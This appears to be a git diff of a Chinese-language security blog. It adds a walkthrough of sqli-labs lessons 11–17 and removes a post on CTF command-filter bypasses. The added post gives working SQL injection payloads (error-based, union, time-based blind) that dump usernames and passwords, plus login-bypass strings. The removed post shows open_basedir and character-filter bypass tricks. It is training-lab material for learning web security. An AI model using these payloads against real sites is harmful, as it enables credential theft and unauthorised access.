@@ -64,6 +64,170 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQL4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/19/SQL4/" class="article-date">
+  <time datetime="2022-02-19T11:26:09.047Z" itemprop="datePublished">2022-02-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL实战"><a href="#SQL实战" class="headerlink" title="SQL实战"></a>SQL实战</h1><p><a href=""><img src="https://img-blog.csdn.net/20180821140031201?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>登陆成功</p>
+<h3 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a><strong>Less-11</strong> POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><p>打开hackbar选中post可以看到，已经自动载入的刚才提交的表单数据：<a href=""><img src="https://img-blog.csdn.net/2018082114073159?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>我刚测试了一下，hackbar提交uname=admin’ and 1=2 –+&amp;passwd=admin&amp;submit=Submit作为post参数时，无论and后面是1=1</p>
+<p>还是1=2，都能登陆，不知道为什么，可能是提交的时候自动加了+号连接语句的问题。</p>
+<p>所以现在改用burpsuit，抓包修改参数。</p>
+<p>重新来过<br>输入admin admin 登陆，抓包，发送到repeater模块</p>
+<p>在repeater中通过修改post的参数进行注入。</p>
+<p>方法一 extractvalue测试payload<br><code>uname=admin&#39; and 1=1 --+ &amp;passwd=admin&amp;submit=Submit //能登陆 uname=admin&#39; and 1=2 --+ &amp;passwd=admin&amp;submit=Submit </code>//不能登陆</p>
+<p>说明注入生效，存在报错型注入，接下来又是重复性工作，上extractvalue()</p>
+<p>爆库payload</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd=admin&amp;submit=Submit</code><br>爆表payload</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&amp;passwd=admin&amp;submit=Submit</code><br>只能查询到前几个表，后面加上not in ()就可以查到其他表了，如：</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in (&#39;emails&#39;)))) --+&amp;passwd=admin&amp;submit=Submit</code><br>这里我们发现没有更多的表了，而users表应该是存放用户信息的，所以我们进入下一步。</p>
+<p>爆列名payload</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+&amp;passwd=admin&amp;submit=Submit</code><br>使用同样方法，可以查询到其他列名，直到遍历出所有列名，我们找到password和uername，开始爆值。</p>
+<p>爆值payload</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&amp;passwd=admin&amp;submit=Submit</code><br>同样使用not in 可以查询其他值：</p>
+<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+&amp;passwd=admin&amp;submit=Submit</code></p>
+<p>方法二 联合查询union select测试payload<br><code>uname=0&#39; union select 1,2  --+&amp;passwd=admin&amp;submit=Submit</code><br>注意uname是错误的，才能显示联合查询内容。</p>
+<p><a href=""><img src="https://img-blog.csdn.net/20180821145858390?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>可以注入。</p>
+<p>然后就是最基本的union select注入，打个样：</p>
+<p>爆库payload</p>
+<p><code>uname=0&#39; union select 1,database() --+&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入-双引号报错型注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入-双引号报错型注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)双引号报错型注入"></a><strong>Less-12</strong> POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)双引号报错型注入</h3><p>按照题意应该是可以使用上一题的payload只需要修改单引号为双引号，但是实际测试不行，无论我使用–+还是%23还是#都不行，我就看了一下php文件：<a href=""><img src="https://img-blog.csdn.net/20180822112455820?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>可以看到sql查询语句：</p>
+<p>@$sql=”SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1”;</p>
+<p>构造一个能闭合语句而且会报错的payload：</p>
+<p>admin”  and extractvalue(1,concat(0x7e,(select database())))  and “ </p>
+<p>最终admin = “admin”  and extractvalue(1,concat(0x7e,(select database())))  and “ “</p>
+<p>传入后就变成了：</p>
+<p><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&quot;admin&quot;  and extractvalue(1,concat(0x7e,(select database())))  and &quot; &quot; and password=($passwd) LIMIT 0,1&quot;;</code></p>
+<p> 前闭合，中间查询，后面报错，应该是这样没错了，实际测试没问题，可以回显，接下来就再concat()中构造查询语句：</p>
+<p>爆库payload</p>
+<p><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select database())))  and &quot; &amp;passwd=admin&amp;submit=Submit</code></p>
+<p>爆表payload</p>
+<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and &quot;  &amp;passwd=admin&amp;submit=Submit</code><br>爆列payload</p>
+<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))  and &quot;  &amp;passwd=admin&amp;submit=Submit</code><br>同样使用not in查询没有显示出的其他值。</p>
+<p>爆值payload</p>
+<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users)))  and &quot;  &amp;passwd=admin&amp;submit=Submit</code></p>
+<p>方法二，联合注入查询。</p>
+<p><code>uname=0&quot;) union select 1,database() --+ &amp;passwd=admin&amp;submit=Submit</code><br>和less-11一样的联合查询，</p>
+<p>方法三，奇淫技巧</p>
+<p> 报错的内容为：</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin”) LIMIT 0,1’ at line 1</p>
+<p>可以看出，他在我们输入的哪里多加了一个双引号和括号。</p>
+<p>据此构造出万能密码的Payload:</p>
+<h4 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h4><p>通过报错可知  是通过’) 闭合的</p>
+<p>发现没有登入成功返回信息 ，看来是要盲注了。</p>
+<p>方法一，报错型</p>
+<p>既然它返回错误信息了，说明有回显，可以报错注入。</p>
+<p>样例payload</p>
+<p><code>uname=admin&#39;) and extractvalue(1,concat(0x7e,(select database())))  and (&#39;</code><br>在concat()中构造查询语句，完事，和less-12以及之前的报错型注入一样，不再赘述。</p>
+<p>方法二，时间型盲注</p>
+<p>因为可以报错注入，这个方法没有回显，就有点鸡肋了，给个样例payload：</p>
+<p><code>uname=admin&#39;) and if(left(database(),1)=&#39;s&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit</code></p>
+<h4 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)</h4><p>输入内容被放到双引号中，报错型注入，注释符不可用</p>
+<p>方法一，报错型</p>
+<p>样例payload</p>
+<p><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select database()))) and &quot;  &amp;passwd=admin&amp;submit=Submit</code></p>
+<p>方法二，时间型盲注</p>
+<p>效率低，鸡肋</p>
+<p>样例payload</p>
+<p><code>uname=admin&quot; and if(left(database(),1)=&#39;s&#39;,sleep(3),1) --+ &amp;passwd=admin&amp;submit=Submit</code><br>方法三，聚合函数</p>
+<p>具有随机性，鸡肋</p>
+<p>样例payload</p>
+<p><code>uname= &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd=admin&amp;submit=Submit</code></p>
+<p>注入结束。</p>
+<h4 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)"></a>less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</h4><p>盲注 - 基于布尔值 - 字符串</p>
+<p>怎么输入都没有回显，那就时间延迟吧。</p>
+<p>布尔测试payload</p>
+<p><code>uname=admin&#39; and 1=1 --+&amp;passwd=admin&amp;submit=Submit    //登陆成功 uname=admin&#39; and 1=2 --+&amp;passwd=admin&amp;submit=Submit    </code>//登录失败</p>
+<p><a href=""><img src="https://img-blog.csdn.net/20180822123533710?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>时间延迟测试payload</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">uname</span>=admin&#x27; and sleep(<span class="number">5</span>) <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>明显延迟，确定使用延迟注入。</p>
+<p>手工延迟注入，最为致命。</p>
+<p>爆库，表，列名，值，</p>
+<p><code>uname=admin&#39; and if(length(database())=8,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</code><br><code>uname=admin&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><code>uname=admin&#39; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</code><br><code>ame=admin&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><code>uname=admin&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</code><br><code>uname=admin&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="Less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注"><a href="#Less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)"></a><strong>Less-16</strong> POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</h3><p>这道题不管我在登陆框怎么输入，都没有错误信息显示，猜测是延迟型盲注。</p>
+<p><a href=""><img src="https://img-blog.csdn.net/20180822132107115?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>方法一，时间延迟注入</p>
+<p>payload和less-15差不多，只需要把上一题正的单引号改为双引号加括号 “) 就完事了。</p>
+<p>不再赘述</p>
+<p>方法二：奇淫技巧：</p>
+<p>万能账号绕过密码验证：admin”)#</p>
+<p>注入结束。</p>
+<h4 id="Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h4><p>单引号报错型， 注释符可用</p>
+<p>这题也没有错误回显，差点就盲注去了，但是我去查了一下php文件：</p>
+<p><a href=""><img src="https://img-blog.csdn.net/20180823154654544?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>显然，这里对uname做了check_input的处理，check_input()函数如下</p>
+<p>看看是如何处理的</p>
+<p>function check_input($value)<br>    {<br>    if(!empty($value))<br>        {<br>        // truncation (see comments)<br>        $value = substr($value,0,15);<br>        }</p>
+<pre><code>    // Stripslashes if magic quotes enabled
+    if (get_magic_quotes_gpc())
+        &#123;
+        $value = stripslashes($value);
+        &#125;
+ 
+    // Quote if not a number
+    if (!ctype_digit($value))
+        &#123;
+        $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;
+        &#125;
+    
+else
+    &#123;
+    $value = intval($value);
+    &#125;
+return $value;
+&#125;
+</code></pre>
+<p>只截取15个字符</p>
+<p>get_magic_quotes_gpc()</p>
+<p>当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1</p>
+<p>当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0</p>
+<p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
+<p>在magic_quotes_gpc = On的情况下，如果输入的数据有</p>
+<p>单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线。</p>
+<p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p>
+<p>ctype_digit()判断是不是数字，是数字就返回true，否则返回false</p>
+<p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>intval()     整型转换</p>
+<p>针对password爆破：</p>
+<p>使用updatexml（），它和extractvaule（）是亲兄弟，以下测试version（）返回mysql版本：</p>
+<p><a href=""><img src="https://img-blog.csdn.net/20180823155358760?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>分别爆表爆库</p>
+<p>palyload时出现问题，加一层select后</p>
+<p>uname=admin&amp;passwd=admin’ and  updatexml(1,concat(0x7e,(select password from (select password from users where username=’admin’))),1) –+ &amp;submit=Submit</p>
+<p><a href=""><img src="https://img-blog.csdn.net/20180823161101362?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></a></p>
+<p>查了一下加个名，就完事了</p>
+<p>最终payload：</p>
+<p><code>uname=admin&amp;passwd=11&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;) mingzi ),0x7e),1) --+&amp;submit=Submit</code><br>也可以用：</p>
+<p><code>uname=admin&amp;passwd=11&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&amp;submit=Submit</code><br>注入完成。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/02/19/SQL4/" data-id="ckzuvfdlu0000gsv30tby49ve" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-SQL3" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/02/14/SQL3/" class="article-date">
@@ -76,7 +240,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SQL实战"><a href="#SQL实战" class="headerlink" title="SQL实战"></a>SQL实战</h1><p><img src="C:\Users\刘雨桐\AppData\Roaming\Typora\typora-user-images\image-20220218193735689.png" alt="image-20220218193735689"></p>
+        <h1 id="SQL实战"><a href="#SQL实战" class="headerlink" title="SQL实战"></a>SQL实战</h1><p>####<img src="C:\Users\刘雨桐\AppData\Roaming\Typora\typora-user-images\image-20220218193735689.png" alt="image-20220218193735689"></p>
 <h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p>UNION： 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
 <h5 id="方法一：手工UNION联合查询注入"><a href="#方法一：手工UNION联合查询注入" class="headerlink" title="方法一：手工UNION联合查询注入"></a>方法一：手工UNION联合查询注入</h5><p>根据报错信息，可以确定输入参数的内容被存放到一对单引号中间，</p>
 <p>猜想：咱们输入的1在数据库中出现的位置为：select … from … where id=’1’ ……，</p>
@@ -1282,98 +1446,6 @@ preg_match('/^*.(flag).*$/',$cmd){
 
 
   
-    <article id="post-web3" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/01/21/web3/" class="article-date">
-  <time datetime="2022-01-21T06:59:57.484Z" itemprop="datePublished">2022-01-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h3 id="常见的绕过姿势"><a href="#常见的绕过姿势" class="headerlink" title="常见的绕过姿势"></a>常见的绕过姿势</h3><h5 id="2-7-6-系统命令构造数字"><a href="#2-7-6-系统命令构造数字" class="headerlink" title="2.7.6 系统命令构造数字:"></a>2.7.6 系统命令构造数字:</h5><p>{_} = “” </p>
-<p> $(())=0 </p>
-<p> $((~$(())))=-1</p>
-<p>相关题⽬: </p>
-<p>ctfshow-web57</p>
-<h5 id="2-7-7-服务器变量构造查询语句"><a href="#2-7-7-服务器变量构造查询语句" class="headerlink" title="2.7.7.服务器变量构造查询语句"></a>2.7.7.服务器变量构造查询语句</h5><ul>
-<li>常⻅的系统变量: </li>
-</ul>
-<p>1.系统变量 </p>
-<p>相关题⽬:web119 </p>
-<p>2.构建tac </p>
-<p>tac====&gt;${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:<del>A}:</del>${SHLVL}}:${PHP_VERS </p>
-<p>ION:${PHP_VERSION:<del>A}:</del>${SHLVL}}} </p>
-<p>⾸先获取到3以便于得到 PHP_CFLAGS 中的tac: </p>
-<p>从 PHP_VERSION 中截取 ${PHP_VERSION:2:1} //切⽚操作 </p>
-<p>这⾥的2: 可以⽤ ${PHP_VERSION:~A} 得到字符串的最后⼀位 </p>
-<p>这⾥的1: 可以⽤ ${<del>SHLVL} 得到，因为按位取反10取反得到01所以 ～2=1 ； 因此: 3=${PHP_VERSION:${PHP_VERSION:</del>A}:<del>${SHLVL}} 最终的tac命令： a. ${PHP_CFLAGS:3:3} //切⽚操作,也就是上⾯3的语句直接复制⼀遍 也就是{PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:</del>A}:${<del>SHLVL}}:${PHP_VERSION:${PHP_VERSION:</del>A}:~${SHLVL}}} //得到tac指令 </p>
-<p>3.构建base64: </p>
-<h5 id="2-7-8-以数字和不敏感函数构造敏感函数"><a href="#2-7-8-以数字和不敏感函数构造敏感函数" class="headerlink" title="2.7.8 以数字和不敏感函数构造敏感函数"></a>2.7.8 以数字和不敏感函数构造敏感函数</h5><p>base_convert(1231231131,10,36) ===&gt;hex2bin </p>
-<p> hex2bin(dechex(1598506324))=======&gt;_GET </p>
-<p>3$hex2bin(dechex(1598506324))=======&gt;$_GET </p>
-<p>相关题⽬: </p>
-<p>ctfshow-web124 </p>
-<h5 id="2-7-9open-basedir-绕过"><a href="#2-7-9open-basedir-绕过" class="headerlink" title="2.7.9open_basedir()绕过"></a>2.7.9open_basedir()绕过</h5><ul>
-<li>传脚本绕过: </li>
-</ul>
-<p>直接把脚本当作参数传⼊，最后⼀⾏是执⾏的命令 </p>
-<p>相关题⽬:ctfshow-web72 </p>
-<ul>
-<li><p>ini_set(‘open_basedir’,’/‘); </p>
-</li>
-<li><p>系统命令不受open_basedir的限制 </p>
-</li>
-</ul>
-<p>1 &lt;?php </p>
-<p>2 ini_set(‘open_basedir’,’/var/www/html’); </p>
-<p>3 $a = eval(system(‘tac /flag.txt’)); //仍然可以执行</p>
-<p>4 ?&gt; </p>
-<ul>
-<li>⼀些其他伪协议不受 open_basedir 的限制==&gt;⽂件包含讲解 </li>
-</ul>
-<h5 id="2-7-10-⽆数字字符绕过"><a href="#2-7-10-⽆数字字符绕过" class="headerlink" title="2.7.10.⽆数字字符绕过"></a>2.7.10.⽆数字字符绕过</h5><ol>
-<li>构造POST数据包 </li>
-</ol>
-<p>通过构造数据包，向⽬标服务器发送⽂件，⽂件已被保存到tmp⽬录下再根据保存的⽂件名的特 </p>
-<p>性(最后⼀个字⺟为⼤写)，筛选⽂件，利⽤ .</p>
-<p>解题思路:</p>
-<ul>
-<li><p>构造post数据包上传文件，linux系统下会保存在/tmp/php???</p>
-</li>
-<li><p>抓包，使文件中包含sh’命令</p>
-</li>
-<li><p>利用.执行</p>
-<p>注意: </p>
-<p>1 tmp目录下文件比较多，我们所上传的文件最后一个字母是大写，因此利用ascii字母的大写匹</p>
-<p>配，过滤掉其他文件[@-[]</p>
-<p>⽆字⺟绕过正则 </p>
-<p>通过汉字或者⼀些不可⻅字符，进⾏异或，求与，取反等操作构建字⺟从⽽构建命令，最后显示 </p>
-<p>的结果是经过url编码的 </p>
-<p>脚本的说明: </p>
-<ul>
-<li> ⽣成字符表脚本 </li>
-<li> 利⽤字符表⽣成我们需要的命令 </li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/21/web3/" data-id="ckyocew810000c8v3e9v35ghy" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1410,6 +1482,10 @@ preg_match('/^*.(flag).*$/',$cmd){
       <ul>
         
           <li>
+            <a href="/2022/02/19/SQL4/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/02/14/SQL3/">(no title)</a>
           </li>
         
@@ -1423,10 +1499,6 @@ preg_match('/^*.(flag).*$/',$cmd){
         
           <li>
             <a href="/2022/01/28/SQL/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/26/web8/">(no title)</a>
           </li>
         
       </ul>
